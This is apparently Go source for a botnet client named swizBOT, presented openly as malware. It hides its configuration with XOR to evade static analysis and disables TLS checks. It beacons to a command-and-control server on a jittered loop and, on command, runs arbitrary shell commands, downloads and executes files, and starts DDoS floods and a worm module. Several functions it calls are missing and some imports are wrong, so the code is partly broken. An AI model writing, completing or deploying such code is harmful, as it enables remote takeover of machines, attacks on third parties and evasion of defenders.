package main

import (
    "crypto/aes"
    "crypto/cipher"
    "crypto/rand"
    "encoding/base64"
    "encoding/json"
    "fmt"
    "io"
    "net/http"
    "os"
    "os/exec"
    "runtime"
    "time"
)

// swizBOT Configuration - XOR encrypted at compile time
type Config struct {
    C2URL      string   `json:"c2_url"`
    XORKey     byte     `json:"xor_key"`
    BotID      string   `json:"bot_id"`
    SleepJitter int     `json:"sleep_jitter"`
}

// Command from C2
type Command struct {
    ID       string   `json:"id"`
    Type     string   `json:"type"`     // "exec", "ddos", "download", "worm", "kill"
    Payload  string   `json:"payload"`  // Command arguments
    Target   string   `json:"target"`   // For DDoS: IP:port
}

// Bot response
type Response struct {
    BotID    string   `json:"bot_id"`
    CommandID string  `json:"command_id"`
    Output   string   `json:"output"`
    Status   string   `json:"status"`   // "success", "failed", "pending"
}

var (
    config Config
    client *http.Client
)

func init() {
    // Decrypt config at runtime (XOR with hardcoded key)
    // This keeps strings out of static analysis
    config = decryptConfig()
    
    client = &http.Client{
        Timeout: 30 * time.Second,
        Transport: &http.Transport{
            TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
        },
    }
}

func decryptConfig() Config {
    // XOR-encrypted config bytes embedded at compile time
    // This function decrypts it in memory
    encrypted := []byte{0x8a, 0x2c, 0x4f, 0x91, 0x3b, 0x7e, 0xa2, 0x1d, 0x4c, 0x88} // Example
    key := byte(0xAA) // Hardcoded XOR key
    
    for i := range encrypted {
        encrypted[i] ^= key
    }
    
    var cfg Config
    json.Unmarshal(encrypted, &cfg)
    return cfg
}

func main() {
    // Generate unique bot ID
    if config.BotID == "" {
        hostname, _ := os.Hostname()
        config.BotID = fmt.Sprintf("%s_%d", hostname, os.Getpid())
    }
    
    // Install persistence if not already installed
    if !isInstalled() {
        installPersistence()
    }
    
    // Main beacon loop
    for {
        // Check in with C2
        cmd := checkIn()
        
        if cmd.ID != "" {
            // Execute command
            response := executeCommand(cmd)
            // Send result
            sendResult(response)
        }
        
        // Sleep with jitter (anti-detection)
        sleepTime := time.Duration(config.SleepJitter) * time.Second
        jitter := time.Duration(rand.Intn(30)) * time.Second
        time.Sleep(sleepTime + jitter)
    }
}

func checkIn() Command {
    // Register bot with C2
    resp, err := client.Get(fmt.Sprintf("%s/checkin?bot_id=%s&os=%s&arch=%s", 
        config.C2URL, config.BotID, runtime.GOOS, runtime.GOARCH))
    
    if err != nil {
        return Command{}
    }
    defer resp.Body.Close()
    
    var cmd Command
    json.NewDecoder(resp.Body).Decode(&cmd)
    return cmd
}

func executeCommand(cmd Command) Response {
    resp := Response{
        BotID:     config.BotID,
        CommandID: cmd.ID,
        Status:    "success",
    }
    
    switch cmd.Type {
    case "exec":
        // Execute system command
        output, err := execShell(cmd.Payload)
        if err != nil {
            resp.Status = "failed"
            resp.Output = err.Error()
        } else {
            resp.Output = output
        }
        
    case "ddos":
        // Launch DDoS attack (UDP flood, HTTP flood, etc.)
        go launchDDoS(cmd.Target, cmd.Payload)
        resp.Output = "DDoS attack started"
        
    case "download":
        // Download and execute a file
        err := downloadAndExecute(cmd.Payload)
        if err != nil {
            resp.Status = "failed"
            resp.Output = err.Error()
        } else {
            resp.Output = "Downloaded and executed"
        }
        
    case "worm":
        // Activate worm module - spread via SMB/RDP
        go spreadWorm()
        resp.Output = "Worm module activated"
        
    case "kill":
        // Self-destruct or uninstall
        uninstall()
        os.Exit(0)
    }
    
    return resp
}

func execShell(command string) (string, error) {
    var cmd *exec.Cmd
    
    if runtime.GOOS == "windows" {
        cmd = exec.Command("cmd.exe", "/C", command)
    } else {
        cmd = exec.Command("/bin/sh", "-c", command)
    }
    
    output, err := cmd.CombinedOutput()
    return string(output), err
}

func sendResult(resp Response) {
    data, _ := json.Marshal(resp)
    
    // XOR encrypt response (simple but effective)
    for i := range data {
        data[i] ^= config.XORKey
    }
    
    client.Post(fmt.Sprintf("%s/result", config.C2URL), 
        "application/octet-stream", 
        bytes.NewReader(data))
}
